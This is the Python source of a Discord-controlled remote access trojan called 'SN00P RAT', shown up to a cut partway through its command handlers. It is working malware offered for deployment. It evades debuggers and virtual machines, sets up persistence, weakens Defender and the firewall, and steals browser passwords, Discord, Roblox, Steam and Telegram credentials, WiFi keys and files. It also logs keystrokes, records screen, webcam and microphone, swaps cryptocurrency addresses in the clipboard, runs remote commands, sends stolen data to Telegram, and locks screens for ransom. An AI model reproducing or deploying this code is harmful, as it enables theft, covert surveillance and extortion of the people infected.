# ================================================================================================
# rat_template.py – COMPLET (SN00P RAT ULTIMATE) – ÉDITION FURTIVE
# ================================================================================================
import os, sys, re, json, base64, ctypes, logging, asyncio, zipfile, threading, platform, subprocess, urllib.request, shutil, socket, tempfile, time, random, winreg, win32gui, win32con, win32process, win32net, win32com.client as wincl, win32crypt, pyautogui, mss, pynput.keyboard as kb, discord, requests, tkinter as tk, PIL.Image as Image, PIL.ImageTk as ImageTk, comtypes, io, ctypes.wintypes, ctypes, _struct, glob, winsound, pyperclip, win32service, win32serviceutil, win32api, win32con, ipaddress, hashlib, hmac, binascii, psutil
from zipfile import ZipFile
from ctypes import *
from comtypes import CLSCTX_ALL
from win32con import SW_HIDE
from mss import mss
from pynput.keyboard import Key, Listener
from discord.ext import commands

# ---------- MODULES OPTIONNELS ----------
try:
    import browserhistory as bh
except:
    bh = None
try:
    import cv2
except:
    cv2 = None
try:
    import numpy as np
except:
    np = None
try:
    import pyaudio
except:
    pyaudio = None
try:
    import wave
except:
    wave = None

# ---------- CONFIGURATION (INJECTÉE PAR LE BUILDER) ----------
TOKEN_ENCODED = "YOUR_BASE64_ENCODED_TOKEN_HERE"
CHANNEL_ENCODED = "YOUR_BASE64_ENCODED_CHANNEL_ID_HERE"

def b64(s):
    return base64.b64decode(s).decode()

def xo(s, k=0x55):
    return ''.join(chr(ord(c) ^ k) for c in s)

# ---------- ANTI-DEBUG / ANTI-VM ----------
def cd():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            sys.exit()
    except:
        pass
    try:
        if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(ctypes.c_bool())):
            sys.exit()
    except:
        pass
    try:
        for p in os.popen('tasklist /FI "IMAGENAME eq vmtoolsd.exe" /FI "IMAGENAME eq VBoxService.exe"').read():
            if any(x in p.lower() for x in ["vbox", "vmware", "qemu", "xen", "virtual"]):
                sys.exit()
    except:
        pass

cd()

# ---------- PERSISTANCE ----------
def prs():
    try:
        p = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(k, "SnoopSys", 0, winreg.REG_SZ, f'"{p}"')
        winreg.CloseKey(k)
        s = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if not getattr(sys, 'frozen', False):
            shutil.copy2(p, os.path.join(s, 'Snoop.lnk'))
        subprocess.run(f'schtasks /create /tn "SnoopUpd" /tr "{p}" /sc onlogon /f', shell=True,
                       creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)
        subprocess.run(['attrib', '+h', '+s', p], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

prs()

# ---------- DÉSACTIVATION SÉCURITÉ (ALLÉGÉE) ----------
def ds():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            # On ne désactive plus la surveillance en temps réel (signature lourde)
            # On ajoute simplement des exclusions et on désactive le pare-feu
            subprocess.run(
                'powershell -c "Add-MpPreference -ExclusionPath C:\\ -ExclusionPath %USERPROFILE% -ExclusionPath %TEMP%"',
                shell=True, creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)
            subprocess.run('netsh advfirewall set allprofiles state off', shell=True,
                           creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)
    except:
        pass

ds()

# ---------- DÉCODAGE TOKEN & CHANNEL ----------
DISCORD_TOKEN = base64.b64decode(TOKEN_ENCODED).decode()
CHANNEL_ID = int(base64.b64decode(CHANNEL_ENCODED).decode())

# ---------- LOGGING & GLOBALS ----------
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("SnoopRAT")
stop_threads = False
_pending = []
_pending_lock = threading.Lock()
bot_loop = None
bot_ready = False
locker_window = None
_killer_stop = threading.Event()
log_channel_id = 0
pid_process = None
test = None
keylogger_listener = None
keylogger_active = False
keylogger_log = []
hook_handle = None
crypto_steal_active = False
telegram_bot_token = None
telegram_chat_id = None
crypto_btc_addr = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
crypto_eth_addr = "0x742d35Cc6634C0532925a3b844B454260b0C3D6C"

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ---------- EMBED SN00P ----------
def se(t, c=0x9b59b6, th=False):
    e = discord.Embed(title="**SN00P RAT • TERMINAL**", description=t, color=c)
    if th:
        e.set_thumbnail(url="")
    e.set_footer(text="")
    return e

# ---------- CACHE CONSOLE ----------
def hc():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

hc()

# ---------- FONCTIONS UTILITAIRES AMÉLIORÉES ----------
def gi():
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "Unknown"

def gsi():
    try:
        cpu = platform.processor()
        if not cpu:
            cpu = "Unknown"
        ram = "Unknown"
        try:
            ram = f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB"
        except:
            pass
        return {
            "PC Name": platform.node(),
            "Username": os.getlogin(),
            "OS": f"{platform.system()} {platform.release()}",
            "Arch": platform.machine(),
            "CPU": cpu,
            "RAM": ram,
            "Admin": "Yes" if ctypes.windll.shell32.IsUserAnAdmin() else "No",
            "IP": gi()
        }
    except:
        return {"PC Name": "Unknown", "Username": "Unknown", "OS": "Unknown", "Arch": "Unknown", "CPU": "Unknown",
                "RAM": "Unknown", "Admin": "Unknown", "IP": "Unknown"}

def git():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
    ms = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
    s = ms // 1000
    m = s // 60
    h = m // 60
    return f"{h}h {m % 60}m {s % 60}s"

def gw():
    w = []
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore')
        profs = re.findall(r"All User Profile\s*:\s(.*)", data)
        for p in profs:
            p = p.strip()
            try:
                info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', p, 'key=clear']).decode('utf-8',
                                                                                                         errors='ignore')
                pw = re.search(r"Key Content\s*:\s(.*)", info)
                w.append(f"**{p}:** `{pw.group(1) if pw else 'No password'}`")
            except:
                w.append(f"**{p}:** `Error`")
        return "\n".join(w) if w else "No WiFi profiles found"
    except:
        return "Error retrieving WiFi"

# ---------- VOL STEAM ----------
def gsteam():
    info = []
    paths = [
        os.path.expanduser("~") + "\\AppData\\Local\\Steam\\config\\loginusers.vdf",
        "C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf",
        "C:\\Program Files\\Steam\\config\\loginusers.vdf"
    ]
    for p in paths:
        if os.path.exists(p):
            try:
                with open(p, 'r', errors='ignore') as f:
                    data = f.read()
                    users = re.findall(r'"(\d+)"\s*{\s*"AccountName"\s*"([^"]+)"', data)
                    for uid, un in users:
                        info.append(f"**Steam ID:** `{uid}`\n**Username:** `{un}`")
                break
            except:
                pass
    return "\n".join(info) if info else "No Steam accounts found"

# ---------- VOL TELEGRAM ----------
def gtelegram():
    try:
        tdata = os.path.expanduser("~") + "\\AppData\\Roaming\\Telegram Desktop\\tdata"
        if os.path.exists(tdata):
            out = "**Telegram session found!**\nPath: `" + tdata + "`\nFiles:\n"
            for f in os.listdir(tdata):
                if f.endswith('.s') or 'auth' in f.lower():
                    out += f"- `{f}`\n"
            return out
        return "Telegram not found"
    except Exception as e:
        return f"Error: {e}"

# ---------- VOL TOKENS DISCORD ----------
def gdt():
    tks = []
    local = os.environ.get('LOCALAPPDATA', '')
    roaming = os.environ.get('APPDATA', '')
    paths = {'Discord': os.path.join(roaming, 'Discord'), 'Discord Canary': os.path.join(roaming, 'discordcanary'),
             'Discord PTB': os.path.join(roaming, 'discordptb'), 'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data'),
             'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
             'Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data'),
             'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable')}
    for n, p in paths.items():
        if not os.path.exists(p): continue
        if "Discord" in n:
            for f in os.listdir(p):
                if re.match(r"app-\d+\.\d+\.\d+", f):
                    ldb = os.path.join(p, f, 'modules', 'discord_desktop_core-1', '..', '..', '..', 'Local Storage',
                                       'leveldb')
                    for l in glob.glob(os.path.join(ldb, '*.ldb')):
                        try:
                            with open(l, 'r', errors='ignore') as fd:
                                for line in fd:
                                    ms = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)
                                    tks.extend([f"[{n}] {m}" for m in ms])
                        except:
                            pass
        else:
            ldb = os.path.join(p, 'Default', 'Local Storage', 'leveldb')
            for l in glob.glob(os.path.join(ldb, '*.ldb')):
                try:
                    with open(l, 'r', errors='ignore') as fd:
                        for line in fd:
                            ms = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)
                            tks.extend([f"[{n}] {m}" for m in ms])
                except:
                    pass
    return "\n".join(set(tks)) if tks else "No tokens found"

# ---------- VOL MOTS DE PASSE CHROME ----------
def gcp():
    try:
        ls = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Local State")
        if not os.path.exists(ls): return "Chrome not found"
        with open(ls, 'r') as f:
            data = json.load(f)
        key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        db = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(db): return "No passwords"
        tmp = os.path.join(tempfile.gettempdir(), "LoginData")
        shutil.copy2(db, tmp)
        conn = sqlite3.connect(tmp)
        c = conn.cursor()
        c.execute("SELECT origin_url, username_value, password_value FROM logins")
        out = []
        for row in c.fetchall():
            url, user, enc = row
            if enc:
                try:
                    dec = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8')
                    out.append(f"URL: {url}\nUser: {user}\nPass: {dec}\n")
                except:
                    out.append(f"URL: {url}\nUser: {user}\nPass: (failed)\n")
        conn.close()
        os.remove(tmp)
        return "\n".join(out) if out else "No passwords found"
    except Exception as e:
        return f"Error: {e}"

# ---------- VOL ROBLOX ----------
def grc():
    try:
        p = os.path.join(os.getenv("USERPROFILE", ""), "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
        if not os.path.exists(p):
            return None, "File not found"
        tmp = os.path.join(tempfile.gettempdir(), "rbx.dat")
        shutil.copy(p, tmp)
        with open(tmp, 'r') as f:
            data = json.load(f)
            enc = data.get("CookiesData", "")
            if not enc:
                return None, "No cookie data"
            dec = base64.b64decode(enc)
            decrypted = win32crypt.CryptUnprotectData(dec, None, None, None, 0)[1].decode(errors='ignore')
            match = re.search(r'(_\|WARNING:.*?);', decrypted)
            if not match:
                return None, "No token"
            token = match.group(1)
            info = fri(token)
            if not info:
                return None, "Invalid token"
            return info, token
    except Exception as e:
        return None, str(e)
    finally:
        if os.path.exists(tmp):
            os.remove(tmp)

def fri(cookie):
    headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
    try:
        r = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=10)
        if r.status_code != 200:
            return None
        u = r.json()
        uid = u["id"]
        robux = requests.get(f"https://economy.roblox.com/v1/users/{uid}/currency", headers=headers, timeout=10).json().get(
            "robux", 0)
        prem = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership", headers=headers,
                            timeout=10).json() if requests.get(
            f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership", headers=headers,
            timeout=10).status_code == 200 else False
        return {"id": uid, "name": u["name"], "robux": robux, "premium": prem}
    except:
        return None

# ---------- KEYLOGGER ----------
def on_press(key):
    global keylogger_log
    try:
        keylogger_log.append(str(key.char))
    except AttributeError:
        if key == kb.Key.space:
            keylogger_log.append(" ")
        elif key == kb.Key.enter:
            keylogger_log.append("\n[ENTER]\n")
        else:
            keylogger_log.append(f"[{str(key).replace('Key.', '')}]")

def skl():
    global keylogger_listener, keylogger_active, keylogger_log
    if keylogger_active:
        return "Already running"
    keylogger_log = []
    keylogger_listener = kb.Listener(on_press=on_press)
    keylogger_listener.start()
    keylogger_active = True
    return "Keylogger started"

def stkl():
    global keylogger_listener, keylogger_active
    if not keylogger_active:
        return "Not running"
    keylogger_listener.stop()
    keylogger_active = False
    return "Keylogger stopped"

def dkl():
    global keylogger_log
    if not keylogger_log:
        return "No logs"
    d = "".join(keylogger_log)
    keylogger_log = []
    return d

# ---------- CAPTURES ----------
def ss():
    try:
        ts = time.strftime("%Y%m%d_%H%M%S")
        p = os.path.join(tempfile.gettempdir(), f"ss_{ts}.png")
        mss().shot(output=p)
        return p
    except:
        return None

def wc():
    if cv2 is None:
        return None
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        cap.release()
        if ret:
            p = os.path.join(tempfile.gettempdir(), "webcam.png")
            cv2.imwrite(p, frame)
            return p
    except:
        pass
    return None

def rm(sec):
    if pyaudio is None or wave is None:
        return None
    try:
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        CHUNK = 1024
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []
        start = time.time()
        while time.time() - start < sec:
            frames.append(stream.read(CHUNK, exception_on_overflow=False))
        stream.stop_stream()
        stream.close()
        audio.terminate()
        p = os.path.join(tempfile.gettempdir(), "mic.wav")
        wf = wave.open(p, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        return p
    except:
        return None

def rs(sec):
    if cv2 is None:
        return None
    try:
        screen = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        p = os.path.join(tempfile.gettempdir(), "screen.avi")
        out = cv2.VideoWriter(p, fourcc, 20.0, screen)
        start = time.time()
        while time.time() - start < sec:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)
            time.sleep(0.05)
        out.release()
        return p
    except:
        return None

def rs_old(sec, offset=0):
    if cv2 is None:
        return None
    try:
        screen = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        p = os.path.join(tempfile.gettempdir(), "recent.avi")
        out = cv2.VideoWriter(p, fourcc, 20.0, screen)
        start = time.time() - offset
        end = start + sec
        while time.time() < end:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)
            time.sleep(0.05)
        out.release()
        return p
    except:
        return None

def es(cmd):
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                creationflags=subprocess.CREATE_NO_WINDOW)
        out, err = proc.communicate(timeout=60)
        return out.decode(errors='ignore') if out else err.decode(errors='ignore')
    except:
        return "Error"

def dl(url, p):
    try:
        r = requests.get(url, timeout=30)
        open(p, 'wb').write(r.content)
        return True
    except:
        return False

def vu():
    os.system("powershell -c (New-Object -ComObject WScript.Shell).SendKeys([char]175)")

def vd():
    os.system("powershell -c (New-Object -ComObject WScript.Shell).SendKeys([char]174)")

# ---------- FONCTIONS POUR OUTILS ----------
def grab_files():
    targets = [os.path.expanduser("~") + "\\Desktop", os.path.expanduser("~") + "\\Documents"]
    exts = (".txt", ".docx", ".pdf", ".jpg", ".png", ".zip", ".rar", ".kdbx", ".json", ".conf", ".log", ".sqlite", ".dat")
    found = []
    for base in targets:
        if not os.path.exists(base):
            continue
        for root, _, files in os.walk(base):
            for f in files:
                if f.lower().endswith(exts):
                    found.append(os.path.join(root, f))
                    if len(found) >= 100:
                        break
            if len(found) >= 100:
                break
    if not found:
        return None
    zp = os.path.join(tempfile.gettempdir(), "grabbed_files.zip")
    with ZipFile(zp, 'w', zipfile.ZIP_DEFLATED) as z:
        for f in found:
            try:
                z.write(f, os.path.basename(f))
            except:
                pass
    return zp

def download_folder(folder_path):
    if not os.path.exists(folder_path) or not os.path.isdir(folder_path):
        return None
    zp = os.path.join(tempfile.gettempdir(), "folder.zip")
    with ZipFile(zp, 'w', zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(folder_path):
            for f in files:
                fp = os.path.join(root, f)
                arc = os.path.relpath(fp, os.path.dirname(folder_path))
                z.write(fp, arc)
    return zp

def scan_lan():
    hosts = []
    try:
        ip = gi()
        base = '.'.join(ip.split('.')[:3]) + "."
        for i in range(1, 255):
            target = base + str(i)
            try:
                if os.system(f"ping -n 1 -w 100 {target} >nul 2>&1") == 0:
                    hosts.append(target)
            except:
                pass
            if len(hosts) > 30:
                break
    except:
        pass
    return hosts

def manage_service(action, name, binpath=None):
    try:
        if action == "install":
            if not binpath:
                return "Missing binary path"
            win32serviceutil.InstallService(name, name, startType=win32service.SERVICE_AUTO_START, exeName=binpath)
            return f"Service '{name}' installed"
        elif action == "remove":
            win32serviceutil.RemoveService(name)
            return f"Service '{name}' removed"
        elif action == "start":
            win32serviceutil.StartService(name)
            return f"Service '{name}' started"
        elif action == "stop":
            win32serviceutil.StopService(name)
            return f"Service '{name}' stopped"
        else:
            return "Invalid action"
    except Exception as e:
        return f"Error: {e}"

# ---------- RANSOMWARE ----------
RANSOM_PW = "Snoop_2025"
IMAGE_URL = "https://i.ibb.co/KpxXhQhm/image.png"
HOSTNAME = socket.gethostname()

def install_keyblock():
    global hook_handle
    WH_KEYBOARD_LL = 13
    WM_KEYDOWN = 0x0100
    VK_LWIN = 0x5B
    VK_RWIN = 0x5C
    LowLevelKeyboardProc = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, ctypes.c_uint64, ctypes.c_int64)

    class KBDLLHOOKSTRUCT(ctypes.Structure):
        _fields_ = [("vkCode", ctypes.wintypes.DWORD), ("scanCode", ctypes.wintypes.DWORD), ("flags", ctypes.wintypes.DWORD),
                    ("time", ctypes.wintypes.DWORD), ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]

    def hook_proc(nCode, wParam, lParam):
        if nCode >= 0 and wParam == WM_KEYDOWN:
            kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
            if kb.vkCode in (VK_LWIN, VK_RWIN):
                return 1
        return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

    hook_proc_callback = LowLevelKeyboardProc(hook_proc)
    hook_handle = ctypes.windll.user32.SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc_callback, 0, 0)
    return hook_handle is not None

def uninstall_keyblock():
    if 'hook_handle' in globals() and hook_handle:
        ctypes.windll.user32.UnhookWindowsHookEx(hook_handle)

def disable_taskmgr():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0,
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def enable_taskmgr():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0,
                             winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "DisableTaskMgr")
        winreg.CloseKey(key)
    except:
        pass

class LockscreenGUI:
    def __init__(self, root, img_url=IMAGE_URL):
        self.root = root
        self.wrong = 0
        self.root.attributes("-fullscreen", True, "-topmost", True)
        self.root.overrideredirect(True)
        install_keyblock()
        disable_taskmgr()
        subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], creationflags=subprocess.CREATE_NO_WINDOW,
                       capture_output=True)
        try:
            resp = requests.get(img_url, timeout=10)
            raw = Image.open(io.BytesIO(resp.content))
            if raw.mode != "RGBA":
                raw = raw.convert("RGBA")
            bg = Image.new("RGBA", raw.size, (0, 0, 0, 255))
            img = Image.alpha_composite(bg, raw).convert("RGB")
        except:
            img = Image.new("RGB", (root.winfo_screenwidth(), root.winfo_screenheight()), (10, 10, 10))
        img = img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)
        self.bg = ImageTk.PhotoImage(img)
        canvas = tk.Canvas(root, highlightthickness=0, bg="black")
        canvas.pack(fill="both", expand=True)
        canvas.create_image(0, 0, image=self.bg, anchor="nw")
        self.entry = tk.Entry(root, font=("Courier", 20), show="*", justify="center", bg="black", fg="#00ff00",
                              insertbackground="#00ff00", relief="flat")
        canvas.create_window(root.winfo_screenwidth() // 2, int(root.winfo_screenheight() * 0.88), window=self.entry,
                             width=350)
        self.root.bind("<Return>", self.check_pw)
        self.entry.focus_set()
        send_msg(":lock: Ransomware activated")

    def check_pw(self, e):
        if self.entry.get() == RANSOM_PW:
            send_msg(f":unlock: Unlocked after {self.wrong} wrong attempts")
            self.cleanup()
            self.root.destroy()
        else:
            self.wrong += 1
            send_msg(f":no_entry: Wrong attempt #{self.wrong}")
            self.entry.delete(0, tk.END)

    def cleanup(self):
        uninstall_keyblock()
        enable_taskmgr()
        subprocess.Popen("explorer.exe", creationflags=subprocess.CREATE_NO_WINDOW)

def run_lockscreen():
    global locker_window
    if not locker_window:
        locker_window = tk.Tk()
        LockscreenGUI(locker_window)
        locker_window.mainloop()

# ================================================================================================
# NOUVELLES FONCTIONNALITÉS
# ================================================================================================

# ---------- UEFI PERSISTENCE ----------
def uefi_persistence():
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            return "Admin required"
        p = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        subprocess.run(f'bcdedit /create /d "SnoopBoot" /application osloader > nul', shell=True,
                       creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)
        result = subprocess.run('bcdedit /enum /v', shell=True, creationflags=subprocess.CREATE_NO_WINDOW,
                                capture_output=True, text=True)
        match = re.search(r'identifier\s+({[^}]+})', result.stdout)
        if match:
            guid = match.group(1)
            subprocess.run(f'bcdedit /set {guid} device partition=C:', shell=True,
                           creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)
            subprocess.run(f'bcdedit /set {guid} path \\Windows\\System32\\winload.efi', shell=True,
                           creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)
            subprocess.run(f'bcdedit /displayorder {guid} /addlast', shell=True,
                           creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)
            efi_dir = "C:\\Windows\\System32\\Snoop"
            if not os.path.exists(efi_dir):
                os.makedirs(efi_dir)
            shutil.copy2(p, os.path.join(efi_dir, "snoop.exe"))
            return f"UEFI entry added with GUID {guid}. File copied to {efi_dir}"
        else:
            return "Failed to create UEFI entry"
    except Exception as e:
        return f"UEFI persistence failed: {e}"

# ---------- CLIPBOARD CRYPTO-STEALER ----------
def crypto_steal_thread():
    global crypto_steal_active, crypto_btc_addr, crypto_eth_addr
    last_clip = ""
    while crypto_steal_active:
        try:
            clip = pyperclip.paste()
            if clip and clip != last_clip:
                if re.match(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clip):
                    pyperclip.copy(crypto_btc_addr)
                    last_clip = crypto_btc_addr
                    send_msg(f":moneybag: **BTC address replaced** with `{crypto_btc_addr}`")
                elif re.match(r'^0x[a-fA-F0-9]{40}$', clip):
                    pyperclip.copy(crypto_eth_addr)
                    last_clip = crypto_eth_addr
                    send_msg(f":moneybag: **ETH address replaced** with `{crypto_eth_addr}`")
                else:
                    last_clip = clip
            time.sleep(0.5)
        except:
            time.sleep(1)

# ---------- TELEGRAM EXFILTRATION ----------
def send_telegram(msg):
    global telegram_bot_token, telegram_chat_id
    if not telegram_bot_token or not telegram_chat_id:
        return
    try:
        url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
        data = {"chat_id": telegram_chat_id, "text": msg, "parse_mode": "Markdown"}
        requests.post(url, json=data, timeout=5)
    except:
        pass

# ================================================================================================
# ÉVÉNEMENTS DU BOT
# ================================================================================================

@bot.event
async def on_ready():
    global bot_loop, bot_ready
    bot_ready = True
    bot_loop = asyncio.get_running_loop()
    bot.loop.create_task(background_sender())

    ch = bot.get_channel(CHANNEL_ID)
    if ch:
        info = gsi()
        embed = discord.Embed(
            title="🟢 **SN00P RAT ONLINE**",
            description="**Nouvelle machine infectée**",
            color=0x00ff00
        )
        embed.add_field(name="🖥️ PC Name", value=f"`{info.get('PC Name', 'Unknown')}`", inline=True)
        embed.add_field(name="👤 Username", value=f"`{info.get('Username', 'Unknown')}`", inline=True)
        embed.add_field(name="🛡️ Admin", value=f"`{info.get('Admin', 'No')}`", inline=True)
        embed.add_field(name="🌐 IP", value=f"`{info.get('IP', 'Unknown')}`", inline=True)
        embed.add_field(name="💻 OS", value=f"`{info.get('OS', 'Unknown')}`", inline=True)
        embed.add_field(name="🧠 CPU", value=f"`{info.get('CPU', 'Unknown')}`", inline=True)
        embed.add_field(name="💾 RAM", value=f"`{info.get('RAM', 'Unknown')}`", inline=True)
        embed.add_field(name="🏷️ Machine", value=f"`{os.getenv('COMPUTERNAME', 'N/A')}`", inline=True)
        embed.set_footer(text="")
        await ch.send(embed=embed)
        send_telegram(f"**SN00P RAT ONLINE**\nPC: {info.get('PC Name')}\nUser: {info.get('Username')}\nIP: {info.get('IP')}")

    game = discord.Game("SN00P RAT")
    await bot.change_presence(activity=game)

async def background_sender():
    global log_channel_id
    await bot.wait_until_ready()
    while True:
        try:
            ch = bot.get_channel(log_channel_id) if log_channel_id else None
            msgs = []
            with _pending_lock:
                while _pending:
                    msgs.append(_pending.pop(0))
            if ch and msgs:
                for m in msgs:
                    try:
                        await ch.send(m)
                    except:
                        pass
        except:
            pass
        await asyncio.sleep(0.5)

def send_msg(c):
    with _pending_lock:
        _pending.append(c)

# ================================================================================================
# COMMANDES (TOUTES INCLUSES)
# ================================================================================================

@bot.command()
async def lock(ctx, target="all"):
    if target.lower() in ["all", HOSTNAME.lower()]:
        await ctx.send(f"🔒 Deploying ransomware on `{HOSTNAME}`...")
        threading.Thread(target=run_lockscreen, daemon=True).start()

@bot.command()
async def unlock(ctx, target="all"):
    global locker_window
    if target.lower() in ["all", HOSTNAME.lower()] and locker_window:
        locker_window.after(0, locker_window.destroy)
        locker_window = None
        await ctx.send(f"🔓 Unlocked `{HOSTNAME}`")

@bot.command()
async def sysinfo(ctx):
    info = gsi()
    desc = "\n".join([f"**{k}:** `{v}`" for k, v in info.items()])
    await ctx.send(embed=se(desc))

@bot.command()
async def publicip(ctx):
    await ctx.send(embed=se(f"`{gi()}`"))

@bot.command()
async def idletime(ctx):
    await ctx.send(embed=se(f"`{git()}`"))

@bot.command()
async def wifi(ctx):
    w = gw()
    await ctx.send(embed=se(w))

@bot.command()
async def grabtokens(ctx):
    await ctx.send("Searching tokens...")
    t = gdt()
    if len(t) > 1900:
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
            f.write(t)
        await ctx.send(file=discord.File(f.name, filename="tokens.txt"))
        os.remove(f.name)
    else:
        await ctx.send(embed=se(f"```{t}```"))
    send_telegram(f"**Tokens dumped**\n{t[:200]}...")

@bot.command()
async def password(ctx):
    await ctx.send("Dumping passwords...")
    p = gcp()
    if len(p) > 1900:
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
            f.write(p)
        await ctx.send(file=discord.File(f.name, filename="passwords.txt"))
        os.remove(f.name)
    else:
        await ctx.send(embed=se(f"```{p}```"))
    send_telegram(f"**Passwords dumped**\n{p[:200]}...")

@bot.command()
async def roblox(ctx):
    await ctx.send("Searching Roblox cookie...")
    info, cookie = grc()
    if info:
        e = discord.Embed(title="Roblox Account", color=0x00A3FF)
        e.add_field(name="User", value=info["name"], inline=True)
        e.add_field(name="Robux", value=f"{info['robux']} R$", inline=True)
        e.add_field(name="Premium", value="✅" if info["premium"] else "❌", inline=True)
        e.add_field(name="Cookie", value=f"```{cookie[:100]}...```", inline=False)
        await ctx.send(embed=e)
        send_telegram(f"**Roblox account**\nUser: {info['name']}\nRobux: {info['robux']}")
    else:
        await ctx.send(f"Failed: {cookie}")

@bot.command()
async def steam(ctx):
    await ctx.send("Searching Steam...")
    s = gsteam()
    await ctx.send(embed=se(s))
    send_telegram(f"**Steam info**\n{s}")

@bot.command()
async def telegraminfo(ctx):
    await ctx.send("Searching Telegram...")
    t = gtelegram()
    await ctx.send(embed=se(t))
    send_telegram(f"**Telegram session**\n{t}")

@bot.command()
async def screenshot(ctx):
    p = ss()
    if p:
        await ctx.send(file=discord.File(p))
        os.remove(p)
    else:
        await ctx.send(embed=se("Failed", color=0xff0000))

@bot.command()
async def webcampic(ctx):
    p = wc()
    if p:
        await ctx.send(file=discord.File(p))
        os.remove(p)
    else:
        await ctx.send(embed=se("Failed", color=0xff0000))

@bot.command()
async def mic(ctx, seconds: int):
    if seconds > 60:
        seconds = 60
    await ctx.send(f"Recording {seconds}s...")
    p = rm(seconds)
    if p:
        await ctx.send(file=discord.File(p))
        os.remove(p)
    else:
        await ctx.send(embed=se("Failed", color=0xff0000))

@bot.command()
async def record(ctx, seconds: int):
    if seconds > 30:
        seconds = 30
    await ctx.send(f"Recording screen {seconds}s...")
    p = rs(seconds)
    if p:
